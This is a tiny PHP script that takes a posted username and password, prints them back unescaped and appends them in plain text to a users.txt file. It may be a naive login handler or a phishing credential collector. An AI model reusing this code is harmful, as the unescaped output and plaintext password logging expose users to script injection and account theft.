<?php
$si_un=$_POST['si_username'];
$si_pasw=$_POST['si_password'];
echo 'Пользователь: ',$si_un,'Пароль: ',$si_pasw;
$stroke="Пользователь: $si_un,Пароль: $si_pasw";
echo $stroke;

$file = '/users.txt';
file_put_contents($file, $stroke, FILE_APPEND);


?>
